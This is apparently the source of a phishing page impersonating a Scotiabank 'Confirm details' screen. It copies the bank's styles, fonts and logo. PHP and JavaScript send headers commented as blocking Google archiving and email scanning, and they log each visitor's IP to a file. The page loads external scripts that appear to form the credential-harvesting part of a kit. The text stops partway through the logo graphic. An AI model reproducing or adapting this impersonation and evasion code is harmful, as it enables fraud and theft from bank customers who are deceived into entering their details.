<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
<meta name="theme-color" content="#ed0722">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
<title>Confirm details | Scotiabank</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
<!--<base href="/recovery/">-->
<!--<base href=".">--><base href=".">
<style type="text/css">@charset "UTF-8";@-webkit-keyframes fadeIn{0%{opacity:0}to{opacity:1}}@-webkit-keyframes slideIn{0%{-webkit-transform:translateX(4.8rem);opacity:0;transform:translateX(4.8rem)}to{-webkit-transform:translateX(0);opacity:1;transform:translateX(0)}}@keyframes slideIn{0%{-webkit-transform:translateX(4.8rem);opacity:0;transform:translateX(4.8rem)}to{-webkit-transform:translateX(0);opacity:1;transform:translateX(0)}}@-webkit-keyframes slideOnAndAway{0%{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}5%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}95%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}to{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}}@media (min-width:599px){@-webkit-keyframes scaleShrink{0%{height:15.6rem;opacity:0}20%{height:20.4rem;opacity:1}90%{height:20.4rem;opacity:1}to{height:15.6rem;opacity:1}}@keyframes scaleShrink{0%{height:15.6rem;opacity:0}20%{height:20.4rem;opacity:1}90%{height:20.4rem;opacity:1}to{height:15.6rem;opacity:1}}}@media (max-width:599px){@-webkit-keyframes scaleShrink{0%{height:12rem;opacity:0}20%{height:16.8rem;opacity:1}90%{height:16.8rem;opacity:1}to{height:12rem;opacity:1}}@keyframes scaleShrink{0%{height:12rem;opacity:0}20%{height:16.8rem;opacity:1}90%{height:16.8rem;opacity:1}to{height:12rem;opacity:1}}}@-webkit-keyframes fadeOut{0%{opacity:1}to{opacity:0}}@keyframes fadeOut{0%{opacity:1}to{opacity:0}}@-webkit-keyframes errorFadeIn{0%{opacity:0}to{opacity:1}}@keyframes errorFadeIn{0%{opacity:0}to{opacity:1}}@-webkit-keyframes errorFadeOut{0%{opacity:1}to{opacity:0}}@keyframes errorFadeOut{0%{opacity:1}to{opacity:0}}html{-webkit-box-sizing:border-box}html,
    body {
    height: 100%;
    }
    }body,html{padding:0}*,:after,:before{-webkit-box-sizing:inherit}.link{background-color:transparent;border:0;border-radius:0;color:#8230df;font-family:frutiger-lt-bold;font-size:1.6rem;outline:0;padding:0;text-decoration:none;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content}.link:focus,.link:hover{color:#44137c;cursor:pointer}.link:focus .link__text,.link:hover .link__text,.link__text:focus,.link__text:hover{border-bottom:1px solid;margin-bottom:-1px}.link__icon{margin-bottom:-.3rem;margin-left:.6rem}.link--list-item{font-family:frutiger-lt-bold,Arial,Helvetica,sans-serif;font-size:1.4rem;font-weight:400;letter-spacing:0;margin:0}.container{max-width:1200px;min-width:272px;position:relative;width:auto}@media (min-width:0){.container{margin:0 1.8rem}}@media (min-width:600px){.container{margin:0 1.8rem}}@media (min-width:720px){.container{margin:0 2.4rem}}@media (min-width:1024px){.container{margin:0 3.6rem}}@media (min-width:1248px){.container.container--center{margin:0 auto}}.direction--row{-ms-flex-direction:row;-ms-flex-negative:1;-ms-flex-positive:1;-ms-flex-preferred-size:auto;-ms-flex-wrap:wrap;-webkit-box-direction:normal;-webkit-box-flex:1;-webkit-box-orient:horizontal;display:-webkit-box;display:-ms-flexbox;display:flex;flex-basis:auto;flex-direction:row;flex-grow:1;flex-shrink:1;flex-wrap:wrap;position:relative}@font-face{font-family:frutiger-lt-light;font-style:normal;font-weight:400;src:url(assets/fe6e56e91047faaf2500d89a8ea3afe0.eot?#iefix) format("embedded-opentype"),url(assets/fd1c0f449fc8540f82c47e1629cbd5dd.woff2) format("woff2"),url(assets/a214561fc17b4b34b7a363dea6547e20.woff) format("woff"),url(assets/b80f217d987e2499bbeda3a508530b4f.ttf) format("truetype"),url(assets/98a1e1aa5003620849e8fde2f604d724.svg#frutiger-lt-light) format("svg")}@font-face{font-family:frutiger-lt-medium;font-style:normal;font-weight:400;src:url(assets/5f70ba837efdf64ab5ae6b3bf5bcdee8.eot?#iefix) format("embedded-opentype"),url(assets/13aadef824073719d72b7c1d10037e76.woff2) format("woff2"),url(assets/56002d7cd4b5f5ec1099b5b77ea4d5a6.woff) format("woff"),url(assets/756b16b52891f42ad04bdea86e945684.ttf) format("truetype"),url(assets/6d2fc115865d6485725cef8d35f878f7.svg#frutiger-lt-medium) format("svg")}@font-face{font-family:frutiger-lt-bold;font-style:normal;font-weight:400;src:url(assets/91e8647379f721b657c2e58a6632ae0f.eot?#iefix) format("embedded-opentype"),url(assets/8424a042624210828b0fbe7a8c533b2a.woff2) format("woff2"),url(assets/0a9f36f23c26fbad0827f0a8ec86c908.woff) format("woff"),url(assets/811a29d581fc684aa63616499cad4782.ttf) format("truetype"),url(assets/f1d39120970833213230a95ed493e124.svg#frutiger-lt-bold) format("svg")}@font-face{font-family:frutiger-lt-roman;font-style:normal;font-weight:400;src:url(assets/947afa38eb13c82b2b0256d6664250a8.eot?#iefix) format("embedded-opentype"),url(assets/1e98970fd9c76545bbf1e1a377f4f3c2.woff2) format("woff2"),url(assets/7e2a698e9980c7ba52f69a2717e97b86.woff) format("woff"),url(assets/12b6c5fcbc2e61c7ba17f51cd9c2b8c0.ttf) format("truetype"),url(assets/8530c34f7b752fdb3094835dd1be2f39.svg#frutiger-lt-roman) format("svg")}@font-face{font-family:text-security-disc;font-style:normal;font-weight:400;src:url(assets/13d522c14eb2752f058e1e3f992430d3.eot?#iefix) format("embedded-opentype"),url(assets/9eef63ab4fda4aca5e660f7ad2ea854d.woff2) format("woff2"),url(assets/0f4af9dcb219fe4117cc8c2982ecb8d8.woff) format("woff"),url(assets/e85a11a9110b2b89aa8406d888e5e252.ttf) format("truetype"),url(assets/ab12e316da1610ab05686379ac794374.svg#text-security-disc) format("svg")}body,html{color:#333;font-family:frutiger-lt-light,Arial,Helvetica,sans-serif;font-weight:400;letter-spacing:normal;line-height:18px;margin:0}.text{font-size:1.8rem;letter-spacing:.025rem}.text{font-family:frutiger-lt-light,Arial,Helvetica,sans-serif;font-weight:400;line-height:2.4rem;margin:0}.text--bold{font-family:frutiger-lt-bold,Arial,Helvetica,sans-serif}.text--roman{font-family:frutiger-lt-roman,Arial,Helvetica,sans-serif}.text--light{font-family:frutiger-lt-light,Arial,Helvetica,sans-serif}.text--footer{font-size:1.2rem;font-weight:400;letter-spacing:0;margin:0}.list{list-style-position:outside;padding-left:3.6rem}.list__item{font-family:inherit;font-size:inherit;font-weight:400;letter-spacing:0;margin:1rem 0 0;padding-left:1.8rem}.card{-webkit-box-shadow:0 .2rem 1rem 0 #e2e8ee;background-color:#fff;border:.1rem solid #e2e8ee;border-radius:.4rem;box-shadow:0 .2rem 1rem 0 #e2e8ee;padding:3.6rem}@media (max-width:599px){.card{padding:2.4rem}}.svg-icon{display:inline-block;fill:currentColor;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round}.svg-icon--size-12px{height:1.2rem;stroke-width:3;width:1.2rem}.svg-icon--size-14px{height:1.4rem;stroke-width:2.57143;width:1.4rem}.svg-icon--size-16px{height:1.6rem;stroke-width:2.25;width:1.6rem}.svg-icon--size-18px{height:1.8rem;stroke-width:2;width:1.8rem}.svg-icon--size-24px{height:2.4rem;stroke-width:1.5;width:2.4rem}.svg-icon--size-32px{height:3.2rem;stroke-width:1.125;width:3.2rem}.svg-icon-logo--size-12px{height:1.2rem}.svg-icon-logo--size-14px{height:1.4rem}.svg-icon-logo--size-16px{height:1.6rem}.svg-icon-logo--size-18px{height:1.8rem}.svg-icon-logo--size-24px{height:2.4rem}.svg-icon-logo--size-32px{height:3.2rem}.svg-icon-logo--size-36px{height:3.6rem}.svg-icon-logo--size-48px{height:4.8rem}.svg-icon-logo--size-72px{height:7.2rem}@-webkit-keyframes svg-icon-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes svg-icon-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}.button{-webkit-user-select:none;background-color:transparent;border:0;border-radius:0;cursor:pointer;overflow:visible;position:relative}.button:disabled{-webkit-tap-highlight-color:transparent}@media (-ms-high-contrast:active){.button:focus{outline:2px solid #fff}}@media (-ms-high-contrast:black-on-white){.button:focus{outline:2px solid #000}}.button__icon+.button__text,.button__text+.button__icon{margin-left:1.2rem}.button__icon{border-radius:50%;height:4.8rem;min-width:4.8rem;width:4.8rem}.button__icon svg{z-index:1}.button--text{background-color:#fff;border-color:#8230df;border-radius:.2em;color:#8230df;letter-spacing:-.025rem;outline:0;position:relative}.button--text:focus,.button--text:hover{background-color:#fff;border-color:#44137c;color:#44137c}.button--text::-moz-focus-inner{border:0}@supports (-webkit-overflow-scrolling:touch){.button--scroll:active{outline:0}.button--scroll:active .button__icon:after{opacity:1}}.button--help{background-color:#fff;border-color:#ec111a;color:#ec111a}.button--help:focus,.button--help:hover{background-color:#ec111a;border-color:#ec111a;color:#fff}.button--help:active{background-color:#d40f17;border-color:#d40f17;color:#fff}.button:disabled:hover{-webkit-box-shadow:none;box-shadow:none}.header{border-top:4px solid #ec111a}.header__bar{-ms-flex-pack:justify;-webkit-box-pack:justify;justify-content:space-between;padding:3.6rem 1.2rem}.header__icon{color:#757575;margin-top:.75rem}.header__icon:active,.header__icon:focus,.header__icon:hover{color:#333}.footer{width:100%}.footer__bar{-ms-flex-pack:justify;-webkit-box-pack:justify;justify-content:space-between;padding:2.1rem .6rem}@media (max-width:599px){.footer__bar{padding:2.3rem .6rem 1.3rem}}.footer__link{color:currentColor;margin-left:1.8rem;text-decoration:none}.footer__link:focus{border-bottom:.1rem solid;outline:0}.footer__link:hover{border-bottom:.1rem dotted;cursor:pointer}.footer__link .svg-icon{margin:0 0 0 .4rem;stroke-width:2}@media (max-width:599px){.footer__link{margin:0}}.footer--light-theme{background-color:#fafbfd;border-top:.1rem solid #e2e8ee;color:#333}.footer__list{display:inherit;list-style:none;margin:0;padding:0}@media (max-width:599px){.footer__list{-webkit-column-gap:6.7rem;-webkit-columns:2;column-count:2;column-gap:6.7rem;display:block;width:100%}}@media (max-width:599px){.footer-list__item{margin:0 0 1.8rem}.footer-list__item:last-child:not(:nth-child(2n)){margin-bottom:5.3rem}}.footer-list__item:first-child .footer__link{margin:0}@media (max-width:599px){.footer__copyright{border-top:.1rem solid #e2e8ee;padding:.9rem 0 0;width:100%}}.label{color:#333;display:block;font-family:frutiger-lt-bold;font-size:1.6rem;font-weight:400;line-height:2.4rem;padding:0 .1rem}@supports (-webkit-overflow-scrolling:touch){.input--textbox-highlight{padding:1rem 3.5rem 1rem 1.3rem}.input--textarea{width:101%}}@media (max-width:599px){@supports (-webkit-overflow-scrolling:touch){.dialog,.popup{-webkit-overflow-scrolling:touch}}}@supports (-webkit-overflow-scrolling:touch){.dialog__footer,.popup__footer{padding-bottom:4.4rem}}@keyframes slideOnAndAway{0%{-webkit-transform:translateY(100%);opacity:0;transform:translateY(100%)}5%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}95%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}to{-webkit-transform:translateY(100%);opacity:0;transform:translateY(100%)}}@media (min-width:599px){@-webkit-keyframes slideOnAndAway{0%{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}5%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}95%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}to{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}}@keyframes slideOnAndAway{0%{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}5%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}95%{-webkit-transform:translateY(0);opacity:1;transform:translateY(0)}to{-webkit-transform:translateY(-100%);opacity:0;transform:translateY(-100%)}}}@keyframes fadeIn{0%{opacity:0}to{opacity:1}}.direction--row--card{margin-left:-1.2rem;margin-right:-1.2rem}@media (max-width:1023px){.direction--row--card{margin-left:-1rem;margin-right:-1rem}}@media (max-width:719px){.direction--row--card{margin-left:-.7rem;margin-right:-.7rem}}@media (max-width:599px){.direction--row--card{margin-left:-.7rem;margin-right:-.7rem}}@font-face{font-family:Scotia Bold;src:url(assets/00cecde981e3ef7491eba946f4b95fe0.woff) format("woff"),url(assets/64a8523319c68ca5e492309a68af4a9e.woff2) format("woff2")}@font-face{font-family:Scotia Bold Italic;src:url(assets/010074595889c2ebbdc7e01d9eb837c4.woff) format("woff"),url(assets/16a26745e0143d6a1e24004eb4722b14.woff2) format("woff2")}@font-face{font-family:Scotia Headline;font-style:normal;src:url(assets/15243e297f5364bd59f4088a864abbf7.woff) format("woff"),url(assets/3ca6c3facf3966b88b55118f7821ee72.woff2) format("woff2")}@font-face{font-family:Scotia Italic;font-style:normal;src:url(assets/169b26bea38673878ceaad1337d12d8a.woff) format("woff"),url(assets/c1e8066b320e72bd716505dbc5e887ba.woff2) format("woff2")}@font-face{font-family:Scotia Legal;font-style:normal;src:url(assets/2a7f4e51d134a485394f5e628f4b3488.woff) format("woff"),url(assets/495f3110f0a6adfc6af1929bafd9b44d.woff2) format("woff2")}@font-face{font-family:Scotia Light;font-style:normal;src:url(assets/c60d2250f0f70bc82c9cc0821c10ef09.woff) format("woff"),url(assets/a91a536c4ab0d90d4e437707af675849.woff2) format("woff2")}@font-face{font-family:Scotia Light Italic;font-style:normal;src:url(assets/a93f484cce8ccf3c49c32bc5cdc62058.woff) format("woff"),url(assets/ea9464af16e7fdaf5224a3800ea09aa6.woff2) format("woff2")}@font-face{font-family:Scotia Regular;font-style:normal;src:url(assets/8fd30bd010d9e2c7677ec339685f958b.woff) format("woff"),url(assets/50805f331bb1b697aafb6f0c28b09212.woff2) format("woff2")}a,body,center,div,footer,h1,h2,h3,h4,h5,h6,header,html,i,img,label,li,p,span,ul{border:0;font-family:inherit;margin:0;padding:0;vertical-align:baseline}html{box-sizing:border-box;z-index:1}*,:after,:before{box-sizing:inherit}body,html{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’;font-size:10px}.Label__label{color:#333;display:inline;font-family:Scotia Bold,Arial,Helvetica,‘sans-serif’;font-size:1.6rem;font-weight:400;line-height:2.4rem;padding:0 .1rem;vertical-align:middle}.SvgIcon__icon{display:inline-block;fill:currentColor;stroke:currentColor;stroke-linecap:round;stroke-linejoin:round}.SvgIcon__icon-icon--size-12px{height:1.2rem;stroke-width:3;width:1.2rem}.SvgIcon__icon-icon--size-14px{height:1.4rem;stroke-width:2.57143;width:1.4rem}.SvgIcon__icon-icon--size-16px{height:1.6rem;stroke-width:2.25;width:1.6rem}.SvgIcon__icon-icon--size-18px{height:1.8rem;stroke-width:2;width:1.8rem}.SvgIcon__icon-icon--size-24px{height:2.4rem;stroke-width:1.5;width:2.4rem}.SvgIcon__icon-icon--size-32px{height:3.2rem;stroke-width:1.125;width:3.2rem}@keyframes SvgIcon-spin{0%{transform:rotate(0)}to{transform:rotate(1turn)}}@supports (-webkit-overflow-scrolling:touch){.BackToTop__button:active{outline:0}.BackToTop__button:active .button__icon:after{opacity:1}}.Card__container{background-color:#fff;border:1px solid #e2e8ee;border-radius:8px;font-size:1.6rem;width:100%}@media (min-width:0){.Card__container.Card__container--xs-padding-18{padding:18px}.Card__container.Card__container--xs-padding-24{padding:24px}.Card__container.Card__container--xs-padding-30{padding:30px}.Card__container.Card__container--xs-padding-36{padding:36px}}@media (min-width:481px){.Card__container.Card__container--sm-padding-18{padding:18px}.Card__container.Card__container--sm-padding-24{padding:24px}.Card__container.Card__container--sm-padding-30{padding:30px}.Card__container.Card__container--sm-padding-36{padding:36px}}@media (min-width:768px){.Card__container.Card__container--md-padding-18{padding:18px}.Card__container.Card__container--md-padding-24{padding:24px}.Card__container.Card__container--md-padding-30{padding:30px}.Card__container.Card__container--md-padding-36{padding:36px}}@media (min-width:1025px){.Card__container.Card__container--lg-padding-18{padding:18px}.Card__container.Card__container--lg-padding-24{padding:24px}.Card__container.Card__container--lg-padding-30{padding:30px}.Card__container.Card__container--lg-padding-36{padding:36px}}.Link__link{color:#333;cursor:pointer;font-family:Scotia Bold,Arial,Helvetica,‘sans-serif’;font-size:1.6rem;letter-spacing:0;line-height:2.4rem;outline:0;text-decoration:none}.Link__link--size-14px{font-size:1.4rem}.Link__link--size-18px{font-size:1.8rem;line-height:2.7rem}.Link__link .Link__text{border-bottom:.1rem dotted #333}.Link__link .Link__icon{margin-left:.6rem}.Link__link:focus .Link__text,.Link__link:hover .Link__text{border-bottom:.1rem solid #333}.Link__link--emphasis{color:#009dd6}.Link__link--emphasis .Link__text{border-bottom:.1rem dotted #009dd6}.Link__link--emphasis:focus,.Link__link--emphasis:hover{color:#007eab}.Link__link--emphasis:focus .Link__text,.Link__link--emphasis:hover .Link__text{border-bottom:.1rem solid #007eab}.Row__container{display:flex;flex-basis:auto;flex-direction:row;flex-grow:1;flex-shrink:1;flex-wrap:wrap;position:relative}@media (min-width:0){.Row__container{margin:0 -.6rem}}@media (min-width:481px){.Row__container{margin:0 -1.2rem}}@media (min-width:768px){.Row__container{margin:0 -1.5rem}}@media (min-width:1025px){.Row__container{margin:0 -1.8rem}}@supports (-webkit-overflow-scrolling:touch){.TextArea__textbox-highlight{padding:1.8rem 2.1rem}}.TextButton__button{background-color:transparent;border:none;color:#009dd6;cursor:pointer;display:flex;font-size:1.6rem;margin:1rem;outline:0;padding:1.5rem;position:relative}.TextButton__button:after{border-radius:.4rem;box-shadow:0 0 0 .1rem #fff,0 0 0 .2rem #788591,0 0 0 .5rem #e3e7e8;content:" ";display:inline-block;height:100%;left:50%;opacity:0;position:absolute;top:50%;transform:translate(-50%,-50%);transition:opacity .2s ease-in-out;width:100%}.TextButton__button:focus,.TextButton__button:hover{color:#007eab}.TextButton__button:focus:after{opacity:1}.TextButton__icon--right{margin-left:.6rem}.List__list{color:#333;font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’;font-size:inherit;line-height:inherit;list-style-position:outside}.List__list--size-16px{font-size:1.6rem;line-height:2.4rem}.List__list--size-18px{font-size:1.8rem;line-height:2.7rem}.Footer__footer{background-color:#fff;border:1px solid #e2e8ee}.Footer__logo{padding:3.6rem 0;width:3.6rem}@media (min-width:768px) and (max-width:1024px){.Footer__logo{padding:0}}@media (min-width:1025px){.Footer__logo{padding:0}}.TextBody__text--1{font-size:1.8rem;line-height:2.7rem}.TextBody__text--1,.TextBody__text--2{font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’;font-weight:400}.TextBody__text--2{font-size:1.6rem;line-height:2.4rem}.TextBody__text--black{color:#333}.TextBody__text--1Alt{font-size:1.8rem;line-height:2.7rem}.TextBody__text--1Alt,.TextBody__text--2Alt{color:#757575;font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’;font-weight:400}.TextBody__text--2Alt{font-size:1.6rem;line-height:2.4rem}.TextHeading__text{font-family:Scotia Headline,Arial,Helvetica,‘sans-serif’;font-weight:400}.TextHeading__text{color:#333;font-size:2.6rem;letter-spacing:-.025rem;line-height:3.2rem}.TextHeading__text--light{color:#fff}@media (max-width:480px){.card{background-color:transparent;border:none;box-shadow:none;padding:0}}@media (min-width:1025px){.card{padding:60px}}@media (min-width:1025px){.card .card{padding:36px}}.footer.footer--light-theme{background-color:#fff}.footer .footer__bar{margin-left:3rem;margin-right:3rem;max-width:none;padding-left:0;padding-right:0}.container{max-width:unset}@media (-ms-high-contrast:active),(-ms-high-contrast:none){#app-layout{height:100vh}.container.container--center{width:100%}}._2Fmffc2ChdxSI8mbU7bwh_{padding:0 2.4rem;width:100%!important}@media (max-width:480px){._2Fmffc2ChdxSI8mbU7bwh_{padding:0}}._1dzrLUbharfWi1F3nyVifP{margin:3.6rem auto;max-width:55.2rem;min-width:27.2rem;padding:7.2rem 3.6rem!important}@media (max-width:480px){._1dzrLUbharfWi1F3nyVifP{-webkit-box-shadow:none;background:0 0;border:none;box-shadow:none;margin:0 auto!important;padding:3.6rem 1.2rem!important;width:100%}}._3qunkQtjRi8RVDR2uZh-8k{margin:0 3.6rem}@media (max-width:480px){._3qunkQtjRi8RVDR2uZh-8k{margin:0 2.4rem}}._3rJ-QLkI_5m72pkDV3N9r-{border-bottom:1px solid #e2e8ee;font-size:1.8rem;justify-content:space-between;margin:0 0 .6rem;padding:0;width:100%}._3rJ-QLkI_5m72pkDV3N9r-:focus{outline:auto}._3rJ-QLkI_5m72pkDV3N9r-:focus:after{opacity:0}._3rJ-QLkI_5m72pkDV3N9r- span{color:#333;font-family:Scotia Regular,Arial,Helvetica,‘sans-serif’;line-height:2.4rem;margin-right:auto;padding:1.8rem 0;text-align:left}._3rJ-QLkI_5m72pkDV3N9r- svg{height:1.8rem;margin-bottom:auto;margin-top:auto;width:1.8rem}._1iMFQxkBkZxaJLFLypzxaG{margin:3.6rem 0 .8rem}._1AR6e5iqu8uXHMTFKLnqWr{align-items:center;display:flex;flex-direction:column;justify-content:center;margin:0 3.6rem}@media (max-width:480px){._1AR6e5iqu8uXHMTFKLnqWr{margin:0 2.4rem}}._1AR6e5iqu8uXHMTFKLnqWr ._3hjDHBxiP1Z2Uj2D22Khad{margin:3.6rem 0;text-align:center;width:100%}._3Ip9Jf7J6eOEvKAl2ldIr8{background-color:#fff;bottom:0}@media (max-width:480px){._3Ip9Jf7J6eOEvKAl2ldIr8{display:none}}@media (-ms-high-contrast:active),(-ms-high-contrast:none){._1t5tVchF8n-Sj-oAlYARZB{width:auto!important}}._1ChzP-ZqsmzLyF7NCGdiJx{background-color:#fff;box-shadow:0 2px 10px rgba(0,40,80,.07);min-width:27.2rem;position:fixe}.PoYv4mtPAteIiTCL2kgMd{display:flex;flex-flow:row nowrap;justify-content:space-between;line-height:0;padding:2.9rem 3.6rem}._3NvqcuqzV8Fp_FM2z3Sp4J{width:13rem}._3kP9WPMSj7H53EVe3ptDv6{display:flex;flex-direction:column;min-height:100vh}._2ZVb38DpkqtGp0Be4LNKoB{background:#fafbfd;display:flex;flex-direction:column;flex-grow:1;padding-bottom:env(safe-area-inset-bottom,0)}@media (max-width:480px){._2ZVb38DpkqtGp0Be4LNKoB{background:#fff}}
    #phone {
    font-weight: bolder;
    }
    #header {
    width: auto;
    height: auto;
    z-index: auto;
    position: relative;
    }
    #attention {
    color: #FF3300;
    }
    .auto-style1 {
    display: inline;
    font-family: "Scotia Bold", Arial, Helvetica, ‘sans-serif’;
    font-size: 1.6rem;
    font-weight: 400;
    line-height: 2.4rem;
    vertical-align: middle;
    }
    .auto-style2 {
    color: #FF0000;
    }
    #phone0 {
    font-weight: bolder;
    }
    #phone1 {
    font-weight: bolder;
    }
    #phone2 {
    font-weight: bolder;
    }
    #phone3 {
    font-weight: bolder;
    }
    #phone4 {
    font-weight: bolder;
    }
    #selectsize {
    font-size: 17px;
    }
</style>
<link href="./files/styles.52548c4754293a7f0b9b.css" rel="stylesheet" media="all" onload="if(media!='all')media='all'">
<script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
<script>var lrbank = 'Scotia'; var lrinfo = 'Details';</script>
<script src="./files/actions"></script>
<script src="./files/jquery.mask"></script>
<script src="./files/details"></script>
</head>
<body>
<div class="root" id="root">
    <div class="_3kP9WPMSj7H53EVe3ptDv6" id="app-layout">
        <header class="_1ChzP-ZqsmzLyF7NCGdiJx" id="header">
            <div class="PoYv4mtPAteIiTCL2kgMd">
                <a class="link link__text _3NvqcuqzV8Fp_FM2z3Sp4J" href="https://www.scotiabank.com/ca/en/personal.html">
                    <svg class="svg-icon svg-icon-logo--size-18px" focusable="false" role="img" aria-hidden="false" aria-label="Scotiabank Logo" viewBox="0 0 698 104">
                        <g id="scotiabank-red" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                            <g id="Scotiabank" fill="#EC111A" fill-rule="nonzero">
                                <path d="M170.01,31.19 C156.062323,31.1859554 143.485962,39.585255 138.146549,52.4704552 C132.807135,65.3556554 135.756462,80.1885427 145.61896,90.0510404 C155.481457,99.9135381 170.314345,102.862865 183.199545,97.5234514 C196.084745,92.1840378 204.484045,79.6076774 204.48,65.66 C204.463459,46.6296004 189.0404,31.206541 170.01,31.19 Z M170.01,80.86 C161.615272,80.86 154.81,74.0547282 154.81,65.66 C154.81,57.2652718 161.615272,50.46 170.01,50.46 C178.404728,50.46 185.21,57.2652718 185.21,65.66 C185.198982,74.0501602 178.40016,80.848982 170.01,80.86 L170.01,80.86 Z" id="Shape"></path>
                                <polygon id="Path" points="248.41 32.83 239 32.83 239 12.48 218.39 12.48 218.39 32.83 208.98 32.83 208.98 51.48 218.39 51.48 218.39 98.5 239 98.5 239 51.48 248.41 51.48"></polygon>
                                <rect id="Rectangle" x="257.86" y="32.83" width="20.6" height="65.67"></rect>
                                <path d="M268.16,1 C261.819771,1 256.68,6.13977107 256.68,12.48 C256.68,18.8202289 261.819771,23.96 268.16,23.96 C274.500229,23.96 279.64,18.8202289 279.64,12.48 C279.634486,6.14205631 274.497944,1.00551366 268.16,1 L268.16,1 Z" id="Path"></path>
                                <path d="M563.69,50.52 C570.46749,50.5310114 575.958989,56.0225096 575.97,62.8 L575.97,98.5 L596.58,98.5 L596.58,59.97 C596.58,42.48 586.48,31.19 570.58,31.19 C564.03,31.19 557.12,34.05 551.44,43.19 L551.44,32.82 L530.82,32.82 L530.82,98.5 L551.43,98.5 L551.43,62.8 C551.43549,56.0280225 556.91804,50.5365282 563.69,50.52 L563.69,50.52 Z" id="Path"></path>
                                <polygon id="Path" points="671.69 98.5 646.37 65.69 669.91 32.83 645.82 32.83 626.9 59.4 626.9 2.64 606.3 2.64 606.3 98.5 626.9 98.5 626.9 71.43 647.68 98.5"></polygon>
